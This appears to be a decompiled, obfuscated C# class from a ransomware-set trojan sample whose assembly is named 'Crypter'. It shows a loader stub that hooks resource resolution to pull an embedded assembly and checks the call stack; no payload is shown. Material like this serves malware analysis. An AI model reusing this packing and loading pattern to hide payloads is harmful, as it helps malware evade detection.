// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Crypter, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B731B599-442F-4A0A-B652-36FDF3199CF1
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.MSIL.Zapchast.ctbt-4d7f60f5f9cd63e753868459d0468b2925cdad0dc9dd53f889e662aa428efebf.exe

using \u0004;
using \u0007;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0004
{
  internal sealed class \u0001
  {
    private static Assembly \u0001;
    private static string[] \u0001;

    internal static void \u0001()
    {
      try
      {
        try
        {
          AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u0001.\u0001);
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
        \u0003.\u0001(ex);
        throw;
      }
    }

    private static Assembly \u0001([In] object obj0, [In] ResolveEventArgs obj1)
    {
      string[] strArray1;
      string name;
      Assembly assembly;
      int index;
      try
      {
        if ((object) \u0001.\u0001 != null)
          goto label_17;
label_1:
        Monitor.Enter((object) (strArray1 = \u0001.\u0001));
        try
        {
          \u0001.\u0001 = Assembly.Load("{a6809b69-3969-4d2b-a30b-c2b76bacd522}, PublicKeyToken=3e56350693f7355e");
          if ((object) \u0001.\u0001 != null)
            \u0001.\u0001 = \u0001.\u0001.GetManifestResourceNames();
        }
        finally
        {
          Monitor.Exit((object) strArray1);
        }
label_17:
        name = obj1.Name;
        index = 0;
        while (true)
        {
          do
          {
            if (index < \u0001.\u0001.Length)
            {
              int num = \u0001.\u0001[index] == name ? 1 : 0;
              if (true)
              {
                if (num != 0)
                {
                  if (true)
                    num = \u0001.\u0001() ? 1 : 0;
                  else
                    goto label_1;
                }
                else
                  goto label_13;
              }
              if (num != 0)
                goto label_12;
            }
            else
              goto label_15;
label_10:
            continue;
label_15:
            if (false)
              goto label_10;
            else
              goto label_16;
          }
          while (false);
          break;
label_13:
          ++index;
        }
        assembly = (Assembly) null;
        if (false)
          goto label_1;
        else
          goto label_19;
label_12:
        assembly = \u0001.\u0001;
        goto label_19;
label_16:
        assembly = (Assembly) null;
      }
      catch (Exception ex)
      {
        string str = name;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) index;
        string[] strArray2 = strArray1;
        object obj = obj0;
        ResolveEventArgs resolveEventArgs = obj1;
        \u0003.\u0001(ex, (object) str, (object) local, (object) strArray2, obj, (object) resolveEventArgs);
        throw;
      }
label_19:
      return assembly;
    }

    private static bool \u0001()
    {
      int index;
      StackFrame[] frames;
      StackFrame stackFrame1;
      try
      {
        bool flag;
        try
        {
          frames = new StackTrace().GetFrames();
          for (index = 2; index < frames.Length; ++index)
          {
            stackFrame1 = frames[index];
            if ((object) stackFrame1.GetMethod().Module.Assembly == (object) Assembly.GetExecutingAssembly())
            {
              flag = true;
              goto label_7;
            }
          }
          flag = false;
        }
        catch
        {
          flag = true;
        }
label_7:
        return flag;
      }
      catch (Exception ex)
      {
        StackFrame[] stackFrameArray = frames;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index;
        StackFrame stackFrame2 = stackFrame1;
        bool flag;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local2 = (ValueType) flag;
        \u0003.\u0001(ex, (object) stackFrameArray, (object) local1, (object) stackFrame2, (object) local2);
        throw;
      }
    }

    static \u0001()
    {
      try
      {
        \u0001.\u0001 = (Assembly) null;
        \u0001.\u0001 = new string[0];
      }
      catch (Exception ex)
      {
        \u0003.\u0001(ex);
        throw;
      }
    }
  }
}
